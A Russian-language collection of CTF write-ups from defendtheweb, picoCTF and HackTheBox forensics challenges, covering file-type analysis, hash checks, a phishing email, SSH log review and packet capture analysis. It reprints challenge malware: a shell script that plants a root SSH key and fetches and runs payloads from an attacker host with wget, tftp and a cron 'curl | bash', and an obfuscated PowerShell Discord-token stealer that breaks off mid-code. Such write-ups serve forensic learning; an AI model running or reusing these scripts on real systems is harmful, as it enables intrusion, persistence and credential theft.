
# 24 bit

**Платформа:**  https://defendtheweb.net/

В этом конкретном примере нам необходимо извлечь данные для входа из файла. Давайте начнем испытание, загрузив файл и попробуем его проанализировать.

![[Pasted image 20240729013950.png]]

При загрузке получаем файл под названием `b1.txt`.  Давайте посмотрим содержимое файла.

![[Pasted image 20240729014657.png]]

Хм,  похоже, что это какой-то двоичный файл. Давайте ка определим что это за двоичный файл:

```bash
file b1.txt    
b1.txt: PC bitmap, Windows 3.x format, 213 x 108 x 24, image size 69120, cbSize 69174, bits offset 54
```

Похоже что это изображение, поробуем поменять формат файла с `.txt` на `.png` или `jpg`, после заново откроем файл:


![[b1.png]]


И БИНГО!

---

# Verify

**Платформа:** https://play.picoctf.org
**Описание:** Люди продолжают пытаться обмануть моих игроков имитацией флагов. Я хочу убедиться, что они получат настоящую вещь! Я собираюсь предоставить хэш SHA-256 и сценарий расшифровки, чтобы вы знали, что мои флаги являются законными.

Файл испытания: Challenge.zip

Примечание. Для этого задания я использую SSH для доступа к файлу задания.

1. Доступ к экземпляру с указанными учетными данными

![[Pasted image 20240914004248.png]]

2. Check the checksum.txt

![[Pasted image 20240914004303.png]]

Исходя из этого, нам нужно проверить файлы в каталоге «files», чтобы увидеть, какой из них соответствует.

3. Используйте sha256sum для перекрестной проверки каждого файла.

```
sha256sum files/*
```

![[Pasted image 20240914004329.png]]

```
sha256sum files/* | grep "467a10447deb3d4e17634cacc2a68ba6c2bb62a6637dad9145ea673bf0be5e02"
```

![[Pasted image 20240914004347.png]]

4. Посмотрите содержимое целевого файла.

```
file files/c6c8b911
```

![[Pasted image 20240914004430.png]]

5. Используйте сценарий расшифровки для расшифровки файла.

```
$ ./decrypt.sh files/c6c8b911
```

![[Pasted image 20240914004457.png]]

There you go, the flag:  
`picoCTF{trust_but_verify_c6c8b911}`

**Источник:** https://medium.com/@shreethaar/picoctf-2024-verify-d2623750a733

---
# Urgent

**Платформа:**  https://hackthebox.com
**Файл** : _forensics_urgent.zip_

**Описание:** В разгар «Схватки» Киберсити фишинговая атака нацелена на его фракции, вызывая хаос. Расшифровывая электронное письмо, киберсыщики спешат отследить его источник в сжатые сроки. Их миссия: разоблачить злоумышленника и восстановить порядок в городе. На неоновых улицах разворачивается битва за киберсправедливость, определяющая судьбу фракций.


Начнем с простого и приятного упражнения, чтобы размять наши натруженные пальцы!

Загрузите файл электронной почты, прикрепленный к вызову, и извлеките архив _forensics_urgent.zip_ в папку. Он должен содержать файл: « _Urgent Faction Recruitment Opportunity — Join Forces Against KORP™ Tyranny.eml_ ».

EML, что означает «электронная почта» или «формат сообщения электронной почты»,==расширение файла для сохранения сообщений электронной почты в виде обычного текста==. Файлы EML имеют структуру заголовка.

![[Pasted image 20240801022425.png]]

Откройте его с помощью своего почтового клиента (конечно, в «песочнице» или виртуальной машине, ведь мы же никому не доверяем и никакому CTF, верно?).

![[Pasted image 20240801022452.png]]

Откройте HTML-вложение.

> Обязательно убедитесь, что вы делаете это в виртуальной машине или в песочнице (sandbox), серьезно...

![[Pasted image 20240801022606.png]]

Ладно, ничего очевидного. Давайте посмотрим на исходный код.

![[Pasted image 20240801022908.png]]

Теперь это выглядит интересно. Похоже, это сообщение, закодированное в URL. Давайте расшифруем его с помощью нашего надежного инструмента CyberChef, используя рецепт **URL Decode** .

![[Pasted image 20240801022921.png]]

Бинго! У нас есть флаг:

> **Флаг** : HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}

# It Has Begun

**Платформа:**  https://hackthebox.com
**Файл** : script.sh

**Описание:** Битва уже близко, и уже выпущено первое испытание! Вы готовы, фракции!? Учитывая, что это только начало, если вы не сможете проявить необходимую командную работу так рано, то ваша гибель, скорее всего, неизбежна.

Загрузите файл испытания «forensics_it_has_begun.zip» и извлеките содержащийся в нем скрипт оболочки. 

**script.sh:**

```bash
#!/bin/sh  
  
if [ "$HOSTNAME" != "KORP-STATION-013" ]; then  
exit  
fi  
  
if [ "$EUID" -ne 0 ]; then  
exit  
fi  
  
docker kill $(docker ps -q)  
docker rm $(docker ps -a -q)  
  
echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keysecho "nameserver 8.8.8.8" >> /etc/resolv.conf  
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config  
echo "128.90.59.19 legions.korp.htb" >> /etc/hosts  
  
for filename in /proc/*; do  
ex=$(ls -latrh $filename 2> /dev/null|grep exe)  
if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_>  
result=$(echo "$filename" | sed "s/\/proc\///")  
kill -9 $result  
echo found $filename $result  
fi  
done  
  
ARCH=$(uname -m)  
array=("x86" "x86_64" "mips" "aarch64" "arm")  
  
if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then  
exit  
fi  
  
  
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH;  
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH;  
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;  
echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
```

> Помните, что это очень простая задача, поэтому смотрите в очевидные места и не усложняйте ее.

Сразу же я вижу кое-что интересное ближе к концу строки echo **«** _ssh-rsa.._ **»** . Обратите внимание на следующую строку: user@ **tS_u0y_ll1w{BTH** . Давайте отбросим часть user@ и поработаем над обратным изменением того, что, по-видимому, является первой частью флага:

```bash
echo "tS_utS_u0y_ll1w{BTH" | rev  
HTB{w1ll_y0u_St
```

Вторая часть флага после тщательного изучения файла bash, похоже, была закодированной строкой в ​​самой последней строке,  
_bash -c '_ **NG5kX3kwdVJfR3IwdU5kISF9** '. Давайте попробуем нашу первую кодировку:

```bash
echo 'NG5kX3kwdVJfR3IwdU5kISF9' | base64 -d  
4nd_y0uR_Gr0uNd!!}
```

Бинго. Теперь у нас есть вторая часть. Легкого вам дня в офисе!

> Флаг : **HTB** {w1ll_y0u_St4nd_y0uR_Gr0uNd!!}

# An Unusual Sighting

**Платформа:**  https://hackthebox.com
**Файлы:**  bash_history.txt,  sshd.log

**Описание:** Поскольку подготовка подходит к концу, а The Fray приближается с каждым днем, наша недавно созданная команда начала работу по рефакторингу нового приложения CMS для конкурса. Однако через некоторое время мы заметили, что большая часть нашей работы таинственным образом исчезает! Нам удалось извлечь логи SSH и историю Bash с нашего сервера разработки. Фракция, которая сумеет раскрыть преступника, получит огромный бонус в конкурсе!

Загрузите и распакуйте ZIP-архив, содержащий два файла, необходимые для расследования: _bash_history.txt_ и _sshd.log._

Нет никаких жестких и быстрых правил для начала такого рода расследования. Многое зависит от опыта и интуиции. Я начал изучать успешные и неудачные входы, прежде чем начать проверку на аномалии. Однако давайте придерживаться поставленной задачи и сосредоточиться на заданных вопросах. Для этого упражнения _grep_ — ваш лучший друг.

> **В1: Каков IP-адрес и порт SSH-сервера (IP:PORT)?**

IP-адрес и порт сервера обычно отображаются в начале файла sshd.log при запуске службы. Порт, который она прослушивает, а также IP-адрес, на котором она принимает соединения, должны быть в первых 3 или 5 строках.

![[Pasted image 20240801033425.png]]

**_Ответ_** : 100.107.36.130:2221

> **В2: Когда произойдет первый успешный вход в систему?**

Мы можем поискать в файле _sshd.log_ « **Accepted password** » или « **Starting session** ». Оба варианта должны работать. Вот небольшая разница между ними:

- **Начало сеанса** : указывает на начало процесса инициализации сеанса с использованием действительных учетных данных или ключа SSH, но не указывает, приняты ли они системой.
- **Принятый пароль** : подтверждает, что пароль пользователя успешно аутентифицирован и принят системой.

Хотя оба варианта дадут вам ответ, более уместно использовать «Accepted».

![[Pasted image 20240801033529.png]]

Легко и просто, и нам придется заняться анализом киберинцидентов.

**_Ответ_** : 2024–02–13 11:29:50

> **В3: Каково время необычного входа в систему?**

Если мы проверим все начатые или принятые сеансы, то увидим IP-адрес, который выделяется как аномальный. Единственный IP-адрес, который не начинается в диапазоне 100.xxx, — это **2.67.182.119** , а соответствующее время сеанса —  **2024–02–19 04:00:14** .

![[Pasted image 20240801033551.png]]
**_Ответ_** : 2024–02–19 04:00:14

> **В4: Каков отпечаток открытого ключа злоумышленника?**

Теперь, когда мы знаем IP-адрес злоумышленника, давайте найдем его.

![[Pasted image 20240801033643.png]]

**_Ответ_** : OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4

>**В5: Какую первую команду выполнил злоумышленник после входа в систему?**

Из Q3 мы знаем время начала сеанса злоумышленника. Теперь давайте соотнесем время с командами.

![[Pasted image 20240801033749.png]]

Злоумышленник вошел в систему в 04:00:14, а ближайшее совпадение с командой, выполняемой после этого времени, было в **04:00:18** , когда он запустил « **_whoami_** ».

> **Ответ** : whoami

>**В6: Какую последнюю команду выполнил злоумышленник перед выходом из системы?**

Из результатов Вопроса 4 (см. скриншот Q4) мы знаем, что злоумышленник отключился в **04:38:17** . Сопоставляя это со временем в _bash_history.txt_ , мы получаем « **./setup** » как последнюю команду, которая была выполнена перед завершением сеанса.

![[Pasted image 20240801033816.png]]

> **Ответ** : ./setup

Бинго! Теперь мы награждены флагом за решение последнего вопроса задачи. Для нетерпеливых вот все ответы и взаимодействие этой задачи.

![[Pasted image 20240801033836.png]]

----
# Fake Boost

**Платформа:**  https://hackthebox.com
**Описание**: В тени The Fray новый тест под названием «Fake Boost» шепчет обещания бесплатных бонусов Discord Nitro. Это ловушка, установленная в мире, где ничто не дается бесплатно. Поскольку фракции сталкиваются и альянсы меняются, правда, стоящая за Fake Boost, может стать ключом к выживанию или падению. Раскусит ли ваша фракция обман? KORP™ бросает вам вызов, чтобы отличить реальность от иллюзии в этом хитром испытании.

**Файл** : capture.pcapng

При анализе перехваченных сетевых пакетов я первым делом выполняю высокоуровневый анализ, прежде чем углубляться в низкоуровневый анализ.

Начнем с моего любимого высокоуровневого представления: **_Статистика → Иерархия протоколов._**

Из статистики я получил следующее:

![[Pasted image 20240808074213.png]]

Мы сразу видим, что есть некоторый HTTP-трафик, содержащий данные. Обычно я либо начинаю с отслеживания HTTP-потока, либо исследую, есть ли какие-либо HTTP-объекты или файлы, которые можно извлечь и экспортировать.

**_Файл → Экспортировать объекты → HTTP_**


![[Pasted image 20240808064927.png]]


> **⚠️Предупреждение** : НЕ делайте этого на рабочей машине или на хост-ОС вашей личной машины напрямую. Используйте виртуальную машину, песочницу или выделенный ноутбук CTF для работы с потенциально вредоносными файлами.

Я экспортировал файлы в свою виртуальную машину Kali.

Файл: **_freediscordnitro_**

Мы начинаем с фильтрации пакетов, чтобы показать только HTTP-трафик. Это показывает freediscordnitro запрос, содержащий что-то похожее на скрипт PowerShell.

![[Pasted image 20240808065234.png]]

![[Pasted image 20240808074406.png]]

Итак, это запутанный скрипт discordnitro.ps1 poweshell.

Этот скрипт выглядит так, будто он что-то деобфусцирует, а затем выполняет это. Мы немного его модифицируем, чтобы он просто выводил деобфусцированное содержимое.  

Команда PowerShell декодирует строку, закодированную в Base64.

```powershell
$jozeq3n = "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gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK0AIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAiCN8yX8BCIg8yXf91XfxFIv81XfxFIv81Xf91XcBCIv81XfxFIgw3X891Xcx3Xv8FXgw3XcBCffxyXfxFIgw3X89yXf9FXf91Xc9yXf9FffxHIv81XfxHI891XfxFff91XcBCI89Ffgw3XcpQD8BCIf91Xc91XvAyLu8CIv8Ffgw1Xf91Lg8iLgwHIp8FKgwHI8BCffxHI8BCfgACX8BCfgwHI89FKgwHI8BCfgkyXoACffhCIcByXfxFI89CIvwHI8ByLf9FIg8yXfBCI8BCfgwHI8BCfK0Afgw3XvAyLg8CIvACI8BCfvACI8BCIvAyLgACIgwFIfByLf91Jgw3XfBCfgwHIgBiLgwHI8BCYfByLf91JgwHXg8FIv81Xg8Cff9FIvACfgwHI8BCfgwFIfByLcByXg8yXfdCI89FIgwnCNwHI89CIvcyLg8CInAGfgcyL8BCfn8CIvAyJgBCIg81XfByXfByXg8Ffgw3X8BCfcBCI8BCfgw3XfByXfByXgAyXf9FIf91XgAyXf9FIfxHI8BCfgwHIg81XfBCIf91Xg81Xg8FIfxHI8pQD8BCIg8CIcBCIf9FIvwHIg8FIgwHXgAyXfByLgACIgACIgACIgACIgwHIp8FKgwHIcBCfgwHI8BCIgACIgACIgACIgACIgACIgACIgkyXoACIfBCI8BCIgACIgACIgACIgACff91XgACfK0AIf91XgACIf91Xf9FIg81Xf91XgAyXf91XfBCIgACIgACIgACIgACIg8FIfByXgACIfBCIg8FIgACIgACIgACIgACIgACIgACIgACIg8FIf91Xf91XgACIgACIgACIgACIgAyXf91Xf9lCNICI0N3bI1SZ0lmcXpQDK0QfK0QKhRXYExGb1ZGJocmbpJHdTRjNlNXYC9GV6oTX0JXZ252bD5SblR3c5N1W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"
$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray()
[array]::Reverse($s0yAY2gmHVNFd7QZ)
$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(-join $s0yAY2gmHVNFd7QZ))
Write-Host $decodedString
```

Чтобы запустить это нам нужно установить `powershell` на linux, либо использовать виртуальную машину или же использовать онлайн сервис для запуска `powershell`. 

Запустив это, мы получим еще один скрипт PowerShell.

```powershell
```powershell
$URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"

function Steal {
    param (
        [string]$path
    )

    $tokens = @()

    try {
        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {

            try {
                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop

                foreach ($regex in @('[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}', 'mfa\.[\w-]{80,95}')) {
                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                        $_.Matches.Value
                    }
                }
            } catch {}
        }
    } catch {}

    return $tokens
}

function GenerateDiscordNitroCodes {
    param (
        [int]$numberOfCodes = 10,
        [int]$codeLength = 16
    )

    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $codes = @()

    for ($i = 0; $i -lt $numberOfCodes; $i++) {
        $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
        $codes += $code
    }

    return $codes
}

function Get-DiscordUserInfo {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    process {
        try {
            $Headers = @{
                "Authorization" = $Token
                "Content-Type" = "application/json"
                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
            }

            $Uri = "https://discord.com/api/v9/users/@me"

            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
            return $Response
        }
        catch {}
    }
}

function Create-AesManagedObject($key, $IV, $mode) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"

    if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
    elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
    elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
    elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
